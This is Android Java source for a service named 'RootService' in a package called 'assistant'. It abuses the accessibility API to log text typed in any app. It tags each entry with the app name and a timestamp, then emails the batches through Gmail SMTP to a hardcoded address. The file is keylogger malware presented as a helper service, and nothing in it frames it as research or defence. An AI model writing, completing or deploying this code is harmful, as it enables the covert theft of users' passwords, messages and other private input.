package com.root.assistant;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.os.AsyncTask;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class RootService extends AccessibilityService {
    
    private static final String TAG = "RootService";
    private static final String EMAIL = "calld283@gmail.com";
    private static final String PASSWORD = "your_password";
    private StringBuilder capturedData = new StringBuilder();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            String packageName = event.getPackageName().toString();
            
            if (!text.isEmpty()) {
                capturedData.append("App: " + packageName + "\nInput: " + text + "\nTime: " + System.currentTimeMillis() + "\n\n");
                
                if (capturedData.length() > 100) {
                    sendEmail(capturedData.toString());
                    capturedData.setLength(0);
                }
            }
        }
    }

    private void sendEmail(String data) {
        try {
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(EMAIL, PASSWORD);
                    }
                });

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(EMAIL));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL));
            message.setSubject("Root Report");
            message.setText(data);

            Transport.send(message);
            
        } catch (Exception e) {
            Log.e(TAG, "Email failed: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }
}
